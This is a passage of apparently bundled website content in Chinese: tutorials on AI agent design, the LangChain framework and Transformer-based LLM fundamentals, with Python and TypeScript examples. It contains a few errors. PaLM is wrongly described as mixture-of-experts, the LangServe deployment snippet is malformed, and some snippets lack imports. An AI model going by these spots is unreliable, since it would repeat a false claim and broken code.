#### 认知层（Cognition Layer）
认知层是Agent的核心智能部分，包括：
- **记忆系统**：短期记忆和长期记忆管理
- **推理引擎**：逻辑推理、概率推理、因果推理
- **规划系统**：任务分解、路径规划、资源分配
- **学习机制**：监督学习、无监督学习、强化学习

#### 行动层（Action Layer）
行动层负责将决策转化为具体的行为：
- 语言输出（对话生成、文本创作）
- 物理控制（机器人运动、设备操作）
- 数字操作（API调用、数据库操作）
- 界面交互（GUI操作、网页浏览）

### 🔧 AI Agent 的核心技术

#### 1. 大语言模型集成
现代AI Agent大量依赖大语言模型（LLM）作为其认知核心：

\`\`\`python
class AIAgent:
    def __init__(self, llm_model):
        self.llm = llm_model
        self.memory = MemorySystem()
        self.planner = PlanningSystem()
        
    def perceive(self, observation):
        """感知环境状态"""
        processed_obs = self.process_observation(observation)
        self.memory.update(processed_obs)
        return processed_obs
    
    def reason(self, goal):
        """基于当前状态和目标进行推理"""
        context = self.memory.get_context()
        plan = self.planner.generate_plan(context, goal)
        return plan
    
    def act(self, action_plan):
        """执行行动计划"""
        for action in action_plan:
            result = self.execute_action(action)
            self.memory.update(result)
        return result
\`\`\`

#### 2. 记忆管理系统
AI Agent的记忆系统是其持续学习和适应的关键：

**短期记忆（Working Memory）**
- 存储当前任务相关的临时信息
- 容量有限但访问速度快
- 支持上下文窗口管理

**长期记忆（Long-term Memory）**
- 存储永久性知识和经验
- 采用向量化存储和检索
- 支持知识图谱构建

\`\`\`python
class MemorySystem:
    def __init__(self):
        self.short_term_memory = []
        self.long_term_memory = VectorDB()
        self.episodic_memory = []
        
    def store_short_term(self, info, ttl=60):
        """存储短期记忆"""
        entry = {
            'content': info,
            'timestamp': time.time(),
            'ttl': ttl
        }
        self.short_term_memory.append(entry)
        self.cleanup_expired()
        
    def store_long_term(self, info, metadata=None):
        """存储长期记忆"""
        embedding = self.embed(info['content'])
        self.long_term_memory.add(embedding, info, metadata)
        
    def retrieve_relevant(self, query, k=5):
        """检索相关信息"""
        query_embedding = self.embed(query)
        results = self.long_term_memory.search(query_embedding, k=k)
        return results
\`\`\`

#### 3. 规划与决策系统
AI Agent的规划系统负责将复杂目标分解为可执行的步骤：

**层次化任务规划（Hierarchical Task Planning）**
- 将高级目标分解为子任务
- 生成执行序列和依赖关系
- 处理异常情况和回退策略

**基于模型的规划（Model-based Planning）**
- 构建环境模型进行预测
- 评估不同行动方案的效果
- 选择最优策略

\`\`\`python
class PlanningSystem:
    def __init__(self):
        self.task_decomposer = TaskDecomposer()
        self.action_planner = ActionPlanner()
        
    def generate_plan(self, context, goal):
        """生成执行计划"""
        # 1. 目标分析
        subgoals = self.analyze_goal(goal)
        
        # 2. 任务分解
        tasks = self.decompose_tasks(subgoals, context)
        
        # 3. 行动序列规划
        action_sequence = self.plan_actions(tasks, context)
        
        # 4. 风险评估
        risks = self.assess_risks(action_sequence)
        
        return {
            'tasks': tasks,
            'actions': action_sequence,
            'risks': risks,
            'confidence': self.calculate_confidence(action_sequence)
        }
\`\`\`

### 🎯 AI Agent 的应用场景

#### 1. 客服机器人
现代客服AI Agent能够处理复杂的客户查询：

**多轮对话管理**
- 维护对话状态和上下文
- 识别用户意图和情感
- 提供个性化服务

**知识库集成**
- 实时查询企业知识库
- 整合多个数据源
- 提供准确答案

#### 2. 自动化助手
AI Agent在办公自动化中的应用：

**文档处理**
- 自动摘要和翻译
- 格式转换和排版
- 内容审核和校对

**日程管理**
- 智能会议安排
- 任务优先级排序
- 进度跟踪和提醒

#### 3. 智能推荐系统
基于用户行为的个性化推荐：

**用户画像构建**
- 多维度数据分析
- 兴趣偏好挖掘
- 行为模式识别

**实时推荐**
- 动态内容匹配
- A/B测试优化
- 反馈循环改进

### 🔬 AI Agent 的实现挑战

#### 1. 幻觉问题（Hallucination）
AI Agent可能会生成不准确或虚假的信息：

**解决方案：**
- 实施事实核查机制
- 集成外部知识验证
- 提供置信度评分

#### 2. 记忆一致性
保持长期记忆的一致性和准确性：

**版本控制**
- 跟踪记忆变更历史
- 处理冲突和矛盾
- 支持记忆更新和修正

#### 3. 安全性和伦理
确保AI Agent的安全可靠运行：

**访问控制**
- 权限管理和认证
- 数据隐私保护
- 审计日志记录

### 🚀 未来发展趋势

#### 1. 多模态融合
未来的AI Agent将更好地整合多种感官输入：

**视觉-语言融合**
- 图像理解和生成
- 视频分析和摘要
- AR/VR交互支持

**音频-文本融合**
- 语音识别和合成
- 情感分析和表达
- 多语言支持

#### 2. 协作式AI
多个AI Agent之间的协作：

**分布式智能**
- 任务分工和协调
- 知识共享和同步
- 集体决策机制

#### 3. 自适应学习
AI Agent的持续学习能力：

**在线学习**
- 实时反馈处理
- 模型增量更新
- 个性化适配

### 📊 AI Agent 性能评估

#### 1. 功能性指标
- 任务完成率
- 响应时间
- 准确率和召回率

#### 2. 用户体验指标
- 用户满意度
- 交互流畅度
- 错误恢复能力

#### 3. 系统稳定性
- 可用性百分比
- 故障恢复时间
- 资源利用率

### 🛠️ 实现示例：智能研究助手

以下是一个完整的AI Agent实现示例：

\`\`\`python
import asyncio
from typing import Dict, List, Any
from dataclasses import dataclass
import openai
import numpy as np
from sklearn.metrics.pairwise import cosine_similarity

@dataclass
class AgentState:
    current_task: str
    memory_buffer: List[str]
    confidence_score: float
    execution_history: List[Dict]

class ResearchAssistant:
    def __init__(self, api_key: str):
        self.client = openai.OpenAI(api_key=api_key)
        self.state = AgentState(
            current_task="",
            memory_buffer=[],
            confidence_score=0.0,
            execution_history=[]
        )
        self.vector_store = {}
        
    async def process_query(self, query: str) -> Dict[str, Any]:
        """处理用户查询"""
        # 1. 理解查询意图
        intent = await self.analyze_intent(query)
        
        # 2. 检索相关信息
        relevant_info = await self.retrieve_information(query)
        
        # 3. 生成响应
        response = await self.generate_response(query, relevant_info)
        
        # 4. 更新状态
        self.update_state(query, response)
        
        return {
            'response': response,
            'confidence': self.state.confidence_score,
            'sources': relevant_info.get('sources', [])
        }
    
    async def analyze_intent(self, query: str) -> str:
        """分析查询意图"""
        prompt = f"""
        分析以下查询的意图类型：
        Query: {query}
        
        可能的意图类型：
        - research: 研究分析
        - summary: 内容总结
        - comparison: 对比分析
        - generation: 内容生成
        - question: 问题解答
        
        请返回最合适的意图类型。
        """
        
        response = self.client.chat.completions.create(
            model="gpt-4",
            messages=[{"role": "user", "content": prompt}],
            max_tokens=20
        )
        
        return response.choices[0].message.content.strip().lower()
    
    async def retrieve_information(self, query: str) -> Dict[str, Any]:
        """检索相关信息"""
        # 使用向量搜索查找相关文档
        query_embedding = await self.get_embedding(query)
        similar_docs = self.search_similar_documents(query_embedding)
        
        return {
            'documents': similar_docs[:5],  # 返回前5个相关文档
            'sources': [doc.get('source', '') for doc in similar_docs[:5]]
        }
    
    async def generate_response(self, query: str, context: Dict[str, Any]) -> str:
        """生成响应"""
        prompt = f"""
        基于以下上下文信息回答用户查询：
        
        上下文信息：
        {context.get('documents', [])}
        
        用户查询：{query}
        
        请提供详细、准确且有条理的回答。
        """
        
        response = self.client.chat.completions.create(
            model="gpt-4",
            messages=[{"role": "user", "content": prompt}],
            max_tokens=1000,
            temperature=0.3
        )
        
        return response.choices[0].message.content
    
    def update_state(self, query: str, response: str):
        """更新Agent状态"""
        self.state.memory_buffer.append(f"Q: {query}")
        self.state.memory_buffer.append(f"A: {response}")
        
        # 限制记忆缓冲区大小
        if len(self.state.memory_buffer) > 20:
            self.state.memory_buffer = self.state.memory_buffer[-20:]
        
        # 记录执行历史
        self.state.execution_history.append({
            'query': query,
            'response': response,
            'timestamp': time.time()
        })

# 使用示例
async def main():
    assistant = ResearchAssistant(api_key="your-api-key")
    
    # 处理用户查询
    result = await assistant.process_query("请分析AI Agent的发展趋势")
    
    print(f"Response: {result['response']}")
    print(f"Confidence: {result['confidence']}")
    print(f"Sources: {result['sources']}")

if __name__ == "__main__":
    asyncio.run(main())
\`\`\`

### 📈 AI Agent 的商业价值

#### 1. 成本效益
- 减少人力成本
- 提高工作效率
- 降低错误率

#### 2. 服务质量
- 24/7可用性
- 一致的服务质量
- 个性化体验

#### 3. 创新机会
- 新业务模式
- 产品差异化
- 市场竞争优势

### 🛡️ 安全考虑

#### 1. 数据安全
- 加密传输和存储
- 访问权限控制
- 数据脱敏处理

#### 2. 模型安全
- 对抗攻击防护
- 模型完整性验证
- 输出过滤机制

#### 3. 合规性
- 遵守数据保护法规
- 透明度要求
- 责任归属明确

AI Agent代表了人工智能发展的新阶段，通过结合大语言模型、记忆系统、规划算法等先进技术，实现了更智能、更自主的决策和执行能力。随着技术的不断进步，AI Agent将在更多领域发挥重要作用，成为人机协作的重要桥梁。`,createdAt:"2026-03-15",updatedAt:"2026-03-15"},{id:"langchain",title:"LangChain 框架深度解析与应用实践",category:"ai",difficulty:"hard",tags:["LangChain","LLM框架","AI开发","链式调用","RAG"],content:`## LangChain 框架深度解析与应用实践

LangChain是一个强大的开源框架，专门用于构建基于大语言模型（LLM）的应用程序。它提供了一套完整的工具、组件和接口，使开发者能够轻松地将LLM集成到各种应用程序中，实现复杂的人工智能功能。

### 🧩 LangChain 核心概念

LangChain的核心理念是将复杂的AI应用分解为可重用的组件，这些组件可以通过链式调用的方式组合起来，形成强大的AI应用。

#### 1. LLMs and Prompts（语言模型和提示）
LangChain支持多种大语言模型，包括OpenAI GPT系列、Anthropic Claude、Hugging Face模型等。

**Prompt Templates（提示模板）**
- 结构化提示管理
- 动态变量注入
- 提示工程最佳实践

\`\`\`typescript
import { PromptTemplate } from "langchain/prompts";

// 创建提示模板
const template = \`你是一个专业的{role}，请基于以下信息回答问题：
上下文：{context}
问题：{question}
请提供详细、准确的回答。\`;

const promptTemplate = new PromptTemplate({
  template,
  inputVariables: ["role", "context", "question"],
});

// 使用模板
const formattedPrompt = await promptTemplate.format({
  role: "技术顾问",
  context: "React是一个JavaScript库",
  question: "React的主要特点是什么？"
});
\`\`\`

#### 2. Chains（链）
Chains是LangChain的核心概念，允许将多个组件链接在一起：

**Simple Sequential Chain（简单顺序链）**
- 按顺序执行多个步骤
- 输入输出自动传递
- 错误处理和重试机制

**Sequential Chain（顺序链）**
- 多输入多输出处理
- 条件分支逻辑
- 并行执行支持

\`\`\`typescript
import { SequentialChain, LLMChain } from "langchain/chains";
import { ChatOpenAI } from "langchain/chat_models/openai";
import { PromptTemplate } from "langchain/prompts";

const model = new ChatOpenAI({ temperature: 0.7 });

// 第一个链：生成摘要
const summarizePrompt = new PromptTemplate({
  template: "请为以下文本生成简洁的摘要：{text}",
  inputVariables: ["text"],
});
const summarizeChain = new LLMChain({
  prompt: summarizePrompt,
  llm: model,
  outputKey: "summary",
});

// 第二个链：基于摘要生成标题
const titlePrompt = new PromptTemplate({
  template: "基于以下摘要生成一个吸引人的标题：{summary}",
  inputVariables: ["summary"],
});
const titleChain = new LLMChain({
  prompt: titlePrompt,
  llm: model,
  outputKey: "title",
});

// 组合成顺序链
const overallChain = new SequentialChain({
  chains: [summarizeChain, titleChain],
  inputVariables: ["text"],
  outputVariables: ["summary", "title"],
});
\`\`\`

#### 3. Agents（代理）
Agents能够根据输入动态选择要执行的动作：

**ReAct Agent（推理和行动代理）**
- 推理过程可视化
- 动作选择策略
- 工具调用机制

**Self-Asking Agent（自问自答代理）**
- 复杂问题分解
- 信息检索策略
- 答案合成机制

\`\`\`typescript
import { initializeAgentExecutorWithOptions } from "langchain/agents";
import { ChatOpenAI } from "langchain/chat_models/openai";
import { SerpAPI } from "langchain/tools";

const model = new ChatOpenAI({ temperature: 0 });
const tools = [
  new SerpAPI(process.env.SERPAPI_API_KEY, {
    gl: "us",
    hl: "en",
  }),
];

const executor = await initializeAgentExecutorWithOptions(
  tools,
  model,
  {
    agentType: "zero-shot-react-description",
    verbose: true,
  }
);

const result = await executor.call({
  input: "今天北京的天气怎么样？"
});
\`\`\`

#### 4. Memory（记忆）
LangChain提供了多种记忆管理机制：

**Buffer Memory（缓冲记忆）**
- 对话历史管理
- 上下文窗口控制
- 记忆长度限制

**Conversation Summary Memory（对话摘要记忆）**
- 长对话摘要
- 关键信息提取
- 记忆压缩优化

\`\`\`typescript
import { ConversationSummaryMemory } from "langchain/memory";
import { ChatOpenAI } from "langchain/chat_models/openai";

const model = new ChatOpenAI({ temperature: 0 });
const memory = new ConversationSummaryMemory({
  llm: model,
  memoryKey: "chat_history",
  inputKey: "input",
});

// 在链中使用记忆
const chain = new LLMChain({
  llm: model,
  prompt: new PromptTemplate({
    template: "之前的对话：{chat_history}\\n\\n用户：{input}\\nAI：",
    inputVariables: ["chat_history", "input"],
  }),
  memory,
});
\`\`\`

#### 5. Indexes（索引）
用于处理外部数据源和文档：

**Document Loaders（文档加载器）**
- PDF、Word、HTML等多种格式支持
- Web页面抓取
- 数据库连接

**Text Splitters（文本分割器）**
- 递归字符分割
- 语义分割
- 自定义分割策略

**Vector Stores（向量存储）**
- Chroma、Pinecone、Weaviate等
- 相似性搜索
- 检索增强生成（RAG）

\`\`\`typescript
import { Document } from "langchain/document";
import { RecursiveCharacterTextSplitter } from "langchain/text_splitter";
import { OpenAIEmbeddings } from "langchain/embeddings/openai";
import { Chroma } from "langchain/vectorstores/chroma";

// 加载文档
const docs: Document[] = [
  new Document({ pageContent: "这是第一个文档的内容..." }),
  new Document({ pageContent: "这是第二个文档的内容..." }),
];

// 文本分割
const textSplitter = new RecursiveCharacterTextSplitter({
  chunkSize: 1000,
  chunkOverlap: 200,
});
const splitDocs = await textSplitter.splitDocuments(docs);

// 创建向量存储
const embeddings = new OpenAIEmbeddings();
const vectorStore = await Chroma.fromDocuments(splitDocs, embeddings, {
  collectionName: "my-documents",
});

// 相似性搜索
const results = await vectorStore.similaritySearch("查询内容", 2);
\`\`\`

### 🔧 LangChain 核心组件详解

#### 1. Models（模型）
LangChain支持多种类型的AI模型：

**Chat Models（聊天模型）**
- OpenAI GPT系列
- Anthropic Claude
- Google PaLM
- 本地模型（如Llama）

\`\`\`typescript
import { ChatOpenAI } from "langchain/chat_models/openai";
import { HumanMessage, SystemMessage } from "langchain/schema";

const chat = new ChatOpenAI({
  temperature: 0.8,
  modelName: "gpt-3.5-turbo",
});

const response = await chat.call([
  new SystemMessage("你是一个专业的技术顾问"),
  new HumanMessage("请解释什么是微服务架构？")
]);
\`\`\`

**Text Completion Models（文本补全模型）**
- 传统的文本生成模型
- 编程辅助
- 内容创作

#### 2. Tools（工具）
Tools是LangChain中可被Agent调用的功能：

**内置工具**
- SerpAPI（搜索引擎）
- Calculator（计算器）
- Wikipedia（维基百科）
- Requests（HTTP请求）

**自定义工具**
- 业务逻辑封装
- API集成
- 数据库操作

\`\`\`typescript
import { DynamicTool } from "langchain/tools";

// 创建自定义工具
const customTool = new DynamicTool({
  name: "weather_api",
  description: "获取指定城市的天气信息",
  func: async (city: string) => {
    // 实际的天气API调用
    const response = await fetch(\`https://api.weather.com/v1/weather?city=\${city}\`);
    const data = await response.json();
    return \`\${city}的天气：\${data.temperature}\xb0C, \${data.condition}\`;
  },
});

// 在Agent中使用
const tools = [customTool];
const executor = await initializeAgentExecutorWithOptions(tools, model, {
  agentType: "zero-shot-react-description",
});
\`\`\`

#### 3. Output Parsers（输出解析器）
用于解析和结构化LLM的输出：

**Structured Output Parser（结构化输出解析器）**
- JSON格式验证
- 类型安全
- 错误处理

\`\`\`typescript
import { StructuredOutputParser } from "langchain/output_parsers";
import { z } from "zod";

const parser = StructuredOutputParser.fromZodSchema(
  z.object({
    mood: z.string().describe("情绪状态"),
    color: z.string().describe("代表颜色"),
    comment: z.string().describe("评论"),
  })
);

const formatInstructions = parser.getFormatInstructions();

const prompt = new PromptTemplate({
  template: "回答用户的问题。\\n{format_instructions}\\n{question}",
  inputVariables: ["question"],
  partialVariables: { format_instructions: formatInstructions },
});

const input = await prompt.format({ question: "今天感觉怎么样？" });
const response = await model.call(input);
const parsed = await parser.parse(response);
\`\`\`

### 🚀 高级应用模式

#### 1. Retrieval-Augmented Generation (RAG)
RAG结合了检索和生成的优势：

\`\`\`typescript
import { RetrievalQAChain } from "langchain/chains";
import { OpenAIEmbeddings } from "langchain/embeddings/openai";
import { Chroma } from "langchain/vectorstores/chroma";

// 创建RAG链
const vectorStore = new Chroma(new OpenAIEmbeddings(), {
  collectionName: "knowledge-base"
});

const retriever = vectorStore.asRetriever();

const qaChain = RetrievalQAChain.fromLLM(model, retriever, {
  returnSourceDocuments: true,
  verbose: true,
});

const result = await qaChain.call({
  query: "关于这个主题的具体信息是什么？"
});
\`\`\`

#### 2. Multi-Modal Applications（多模态应用）
结合文本、图像等多种输入：

**Vision-Language Models（视觉-语言模型）**
- 图像理解
- 视觉问答
- 图像生成

#### 3. Conversational AI（对话AI）
构建复杂的对话系统：

**Context Management（上下文管理）**
- 对话状态跟踪
- 意图识别
- 情感分析

\`\`\`typescript
import { ConversationChain } from "langchain/chains";

const conversation = new ConversationChain({
  llm: model,
  memory: new ConversationSummaryMemory({
    llm: model,
    memoryKey: "history",
  }),
});

// 连续对话
const response1 = await conversation.call({ input: "你好！" });
const response2 = await conversation.call({ input: "你能帮我做什么？" });
const response3 = await conversation.call({ input: "请推荐一些编程语言" });
\`\`\`

### 📊 LangChain 生态系统

#### 1. LangServe
用于部署LangChain应用的服务器：

\`\`\`python
from langserve import RemoteRunnable
from langchain.chat_models import ChatOpenAI
from langchain.prompts import ChatPromptTemplate

# 创建可部署的链
prompt = ChatPromptTemplate.from_messages([
    ("system", "你是一个友好的AI助手"),
    ("human", "{question}")
])

chain = prompt | ChatOpenAI() | StrOutputParser()

# 部署
app = FastAPI()
app.include_router(chain.with_types(input_type=str).with_config({"run_name": "llm_chain"}).bind()).as_router()
\`\`\`

#### 2. LangSmith
用于监控、调试和评估LangChain应用：

- 链执行追踪
- 性能分析
- A/B测试
- 成本监控

#### 3. LangGraph
用于构建状态图驱动的AI应用：

\`\`\`python
from langgraph.graph import StateGraph, END

class State(TypedDict):
    query: str
    documents: List[Document]
    response: str

def retrieve(state: State) -> State:
    # 检索相关文档
    docs = vector_store.similarity_search(state["query"])
    return {"documents": docs}

def generate(state: State) -> State:
    # 基于文档生成响应
    context = "\\n".join([doc.page_content for doc in state["documents"]])
    response = llm(f"基于以下信息回答：{context}\\n问题：{state['query']}")
    return {"response": response}

# 构建状态图
workflow = StateGraph(State)
workflow.add_node("retrieve", retrieve)
workflow.add_node("generate", generate)
workflow.set_entry_point("retrieve")
workflow.add_edge("retrieve", "generate")
workflow.add_edge("generate", END)

app = workflow.compile()
\`\`\`

### 🛠️ 实际应用案例

#### 1. 智能客服系统
\`\`\`typescript
import { ConversationalRetrievalQAChain } from "langchain/chains";
import { OpenAIEmbeddings } from "langchain/embeddings/openai";
import { PineconeStore } from "langchain/vectorstores/pinecone";

// 客服知识库
const embeddings = new OpenAIEmbeddings();
const vectorStore = await PineconeStore.fromExistingIndex(embeddings, {
  pineconeIndex: pineconeClient.index("customer-support"),
});

const qaChain = ConversationalRetrievalQAChain.fromLLM(
  model,
  vectorStore.asRetriever(),
  {
    returnSourceDocuments: true,
    verbose: true,
  }
);

// 处理客户咨询
const result = await qaChain.call({
  question: "我的订单什么时候能到货？",
  chat_history: [],
});
\`\`\`

#### 2. 文档分析助手
\`\`\`typescript
import { createRetrievalChain } from "langchain/chains/retrieval";
import { createStuffDocumentsChain } from "langchain/chains/combine_documents";

// 创建文档分析链
const combineDocsChain = await createStuffDocumentsChain({
  llm: model,
  documentPrompt: new PromptTemplate({
    template: "{page_content}",
    inputVariables: ["page_content"],
  }),
});

const retrievalChain = await createRetrievalChain({
  combineDocsChain,
  retriever: vectorStore.asRetriever(),
});

const result = await retrievalChain.invoke({
  input: "这份合同的主要条款是什么？"
});
\`\`\`

#### 3. 代码审查助手
\`\`\`typescript
const codeReviewPrompt = new PromptTemplate({
  template: \`请审查以下代码并提供改进建议：
  
代码：
\`\`\`{language}
{code}
\`\`\`

请关注：
1. 代码质量
2. 安全漏洞
3. 性能问题
4. 最佳实践

提供具体的改进建议：\`,
  inputVariables: ["code", "language"],
});

const codeReviewChain = new LLMChain({
  llm: model,
  prompt: codeReviewPrompt,
});

const reviewResult = await codeReviewChain.call({
  code: "// 用户提交的代码",
  language: "typescript",
});
\`\`\`

### 🚀 最佳实践

#### 1. 性能优化
- 缓存机制
- 批处理
- 异步处理
- 模型选择策略

#### 2. 错误处理
- 重试机制
- 降级策略
- 异常捕获
- 日志记录

#### 3. 安全考虑
- 输入验证
- 输出过滤
- 访问控制
- 数据脱敏

### 📈 LangChain 未来发展

#### 1. 更强的多模态支持
- 图像、音频、视频处理
- 跨模态理解
- 生成能力增强

#### 2. 更好的可观察性
- 执行追踪
- 性能监控
- 成本分析
- 调试工具

#### 3. 更丰富的生态系统
- 更多模型支持
- 更多工具集成
- 更好的部署选项
- 社区贡献

LangChain作为AI应用开发的重要框架，为开发者提供了构建复杂AI系统的强大工具集。通过合理的组件组合和链式调用，可以快速构建出功能丰富、性能优异的AI应用。随着生态系统的不断完善，LangChain将继续在AI应用开发领域发挥重要作用。`,createdAt:"2026-03-15",updatedAt:"2026-03-15"},{id:"llm-fundamentals",title:"大语言模型（LLM）核心技术原理",category:"ai",difficulty:"hard",tags:["LLM","Transformer","注意力机制","预训练","微调"],content:`## 大语言模型（LLM）核心技术原理

大语言模型（Large Language Models, LLMs）是现代人工智能领域的核心技术之一，它们通过深度学习和大规模数据训练，实现了对自然语言的深刻理解和生成能力。本文将深入探讨LLM的核心技术原理、发展历程和实现机制。

### 🧠 语言模型的发展历程

语言模型的发展经历了几个重要阶段：

#### 1. 统计语言模型
早期的语言模型基于统计方法：
- **N-gram模型**：基于马尔可夫假设，使用前N-1个词预测下一个词
- **平滑技术**：解决零概率问题，如加一平滑、Good-Turing平滑
- **局限性**：无法捕捉长距离依赖，参数空间巨大

#### 2. 神经网络语言模型
神经网络的引入带来了突破：
- **词嵌入（Word Embedding）**：将词汇映射到连续向量空间
- **循环神经网络（RNN）**：处理序列数据，捕捉上下文信息
- **长短期记忆网络（LSTM）**：解决梯度消失问题，处理长序列

#### 3. Transformer时代
Transformer架构彻底改变了语言模型：
- **注意力机制**：并行处理，捕捉全局依赖
- **自注意力**：同一序列内元素间的相互关注
- **位置编码**：保留序列位置信息

### 🔬 Transformer架构详解

Transformer是现代LLM的基础架构，由Vaswani等人在2017年提出。

#### 1. 自注意力机制（Self-Attention）
自注意力机制是Transformer的核心：

\`\`\`python
import torch
import torch.nn.functional as F

def scaled_dot_product_attention(Q, K, V, mask=None):
    """
    计算缩放点积注意力
    Q: 查询矩阵 (batch_size, seq_len, d_k)
    K: 键矩阵 (batch_size, seq_len, d_k)
    V: 值矩阵 (batch_size, seq_len, d_v)
    """
    # 计算注意力分数
    scores = torch.matmul(Q, K.transpose(-2, -1)) / math.sqrt(Q.size(-1))
    
    # 应用掩码（如果有的话）
    if mask is not None:
        scores.masked_fill_(mask == 0, -1e9)
    
    # 计算注意力权重
    attention_weights = F.softmax(scores, dim=-1)
    
    # 计算输出
    output = torch.matmul(attention_weights, V)
    
    return output, attention_weights
\`\`\`

**多头注意力（Multi-Head Attention）**：
- 并行计算多个注意力头
- 捕捉不同类型的语言关系
- 增强模型的表达能力

#### 2. 位置编码（Positional Encoding）
由于Transformer缺乏内在的位置概念，需要显式添加位置信息：

\`\`\`python
import math

def positional_encoding(seq_len, d_model):
    """
    位置编码实现
    seq_len: 序列长度
    d_model: 模型维度
    """
    pe = torch.zeros(seq_len, d_model)
    position = torch.arange(0, seq_len, dtype=torch.float).unsqueeze(1)
    
    div_term = torch.exp(torch.arange(0, d_model, 2).float() *
                        -(math.log(10000.0) / d_model))
    
    pe[:, 0::2] = torch.sin(position * div_term)
    pe[:, 1::2] = torch.cos(position * div_term)
    
    return pe.unsqueeze(0)
\`\`\`

#### 3. 前馈神经网络（Feed-Forward Network）
每个位置独立应用相同的前馈网络：

\`\`\`python
class PositionWiseFeedForward(nn.Module):
    def __init__(self, d_model, d_ff, dropout=0.1):
        super().__init__()
        self.linear1 = nn.Linear(d_model, d_ff)
        self.linear2 = nn.Linear(d_ff, d_model)
        self.dropout = nn.Dropout(dropout)
        self.activation = nn.ReLU()
    
    def forward(self, x):
        return self.linear2(self.dropout(self.activation(self.linear1(x))))
\`\`\`

### 🏗️ LLM的预训练范式

#### 1. 预训练任务
LLM通常使用以下预训练任务：

**自回归语言建模（Autoregressive LM）**：
- GPT系列采用此方法
- 从左到右预测下一个词
- 适用于生成任务

**去噪自编码（Denoising Autoencoding）**：
- BERT系列采用此方法
- 随机遮蔽部分token进行预测
- 适用于理解任务

**前缀语言建模（Prefix LM）**：
- 结合双向理解和单向生成
- 如GPT-2的变体

#### 2. 预训练数据
高质量、大规模的训练数据是LLM成功的关键：

**数据来源**：
- 网页爬取（Common Crawl, WebText）
- 书籍和文章
- 代码仓库（GitHub, Stack Overflow）
- 学术论文
- 社交媒体内容

**数据处理**：
- 文本清洗和去重
- 质量过滤
- 版权和隐私检查
- 格式标准化

#### 3. 训练策略
**课程学习（Curriculum Learning）**：
- 从简单到复杂的数据分布
- 渐进式增加难度
- 提高训练效率

**混合精度训练**：
- 使用FP16或BF16减少内存占用
- 保持训练稳定性
- 加速训练过程

### 🎯 模型微调技术

#### 1. 全量微调（Full Fine-tuning）
- 更新所有模型参数
- 最优性能但计算成本高
- 需要大量GPU资源

#### 2. 参数高效微调（Parameter-Efficient Fine-tuning）
**LoRA（Low-Rank Adaptation）**：
- 低秩分解适应
- 显著减少参数数量
- 保持原始模型不变

\`\`\`python
class LoRALayer(nn.Module):
    def __init__(self, in_features, out_features, rank, alpha):
        super().__init__()
        self.lora_A = nn.Parameter(torch.zeros(rank, in_features))
        self.lora_B = nn.Parameter(torch.zeros(out_features, rank))
        self.alpha = alpha
        self.rank = rank
        
        # 初始化
        nn.init.kaiming_uniform_(self.lora_A, a=math.sqrt(5))
        nn.init.zeros_(self.lora_B)
    
    def forward(self, x):
        return (self.alpha / self.rank) * x @ self.lora_A.T @ self.lora_B.T
\`\`\`

**Adapter Layers**：
- 插入小型适配器层
- 冻结原始参数
- 模块化微调

#### 3. 指令微调（Instruction Tuning）
- 使用指令-响应对进行训练
- 提高模型遵循指令的能力
- 如InstructGPT、Alpaca等

### 🧪 推理优化技术

#### 1. 推理加速
**KV缓存（KV Cache）**：
- 缓存注意力键值对
- 避免重复计算
- 显著提升生成速度

**投机采样（Speculative Sampling）**：
- 使用小模型预测候选序列
- 大模型验证和修正
- 提高吞吐量

#### 2. 内存优化
**FlashAttention**：
- 减少内存访问
- 提高计算效率
- 支持更长序列

**梯度检查点（Gradient Checkpointing）**：
- 用计算换内存
- 支持更大模型训练
- 控制内存峰值

### 📊 模型评估指标

#### 1. 传统指标
- **困惑度（Perplexity）**：衡量语言模型质量
- **BLEU/ROUGE**：评估生成质量
- **准确率/精确率/召回率**：分类任务指标

#### 2. LLM特有指标
**人类偏好对齐**：
- 与人类判断的相关性
- 偏好学习（Preference Learning）
- RLHF（Reinforcement Learning from Human Feedback）

**安全性评估**：
- 有害内容检测
- 偏见和公平性
- 隐私泄露风险

### 🔒 安全性和对齐

#### 1. RLHF（人类反馈强化学习）
RLHF是当前主流的对齐方法：

**奖励模型训练**：
- 人类标注偏好数据
- 训练奖励模型
- 评估模型输出质量

**PPO优化**：
- 使用奖励信号优化策略
- 平衡性能和对齐
- 避免过度优化

#### 2. 安全措施
**内容过滤**：
- 输入输出过滤器
- 有害内容检测
- 主题边界控制

**模型编辑**：
- 知识编辑技术
- 偏见消除
- 事实纠正

### 🚀 模型架构演进

#### 1. GPT系列
- **GPT-1**: 首次展示Transformer在语言建模的成功
- **GPT-2**: 多任务学习，zero-shot能力
- **GPT-3**: 175B参数，few-shot学习
- **GPT-3.5**: ChatGPT，对话能力
- **GPT-4**: 多模态，更强推理

#### 2. 其他重要架构
**PaLM（Pathways Language Model）**：
- 540B参数
- 专家混合（MoE）架构
- 代码和数学能力

**Chinchilla**：
- 优化的缩放法则
- 4倍数据，更小模型
- 数据效率优先

### 📈 训练基础设施

#### 1. 分布式训练
**数据并行**：
- 复制模型到多个设备
- 并行处理不同数据批次
- AllReduce同步梯度

**模型并行**：
- 分割模型到多个设备
- 处理超大模型
- 流水线并行优化

#### 2. 训练优化
**学习率调度**：
- 预热阶段
- 余弦退火
- 自适应调整

**正则化技术**：
- Dropout
- 权重衰减
- 梯度裁剪

### 🛠️ 实际应用考虑

#### 1. 部署策略
**模型量化**：
- INT8量化
- 混合精度
- 知识蒸馏

**服务架构**：
- 批处理优化
- 请求队列管理
- 负载均衡

#### 2. 成本效益
**硬件选择**：
- GPU/TPU比较
- 内存带宽需求
- 能耗考虑

**运营成本**：
- 训练成本
- 推理成本
- 维护开销

### 🌟 未来发展方向

#### 1. 架构创新
- 稀疏激活网络
- 动态计算路径
- 记忆增强机制

#### 2. 训练方法
- 更高效的预训练
- 持续学习
- 多任务统一

#### 3. 应用拓展
- 多模态融合
- 代理能力
- 专业化领域

大语言模型代表了人工智能发展的重要里程碑，其核心技术仍在快速发展。理解这些基础原理对于掌握和应用LLM技术至关重要。随着技术的不断进步，LLM将在更多领域发挥重要作用，推动人工智能的普及和发展。`,createdAt:"2026-03-15",updatedAt:"2026-03-15"},{id:"vector-databases",title:"向量数据库核心技术与应用实践",category:"ai",difficulty:"hard",tags:["向量数据库","相似性搜索","嵌入向量","RAG","Chroma","Pinecone"],content:`## 向量数据库核心技术与应用实践

向量数据库是现代AI应用的核心基础设施，专门用于存储、索引和检索高维向量数据。随着大语言模型和机器学习应用的普及，向量数据库已成为实现语义搜索、推荐系统、相似性匹配等功能的关键技术。

### 🧠 向量数据库的基本概念

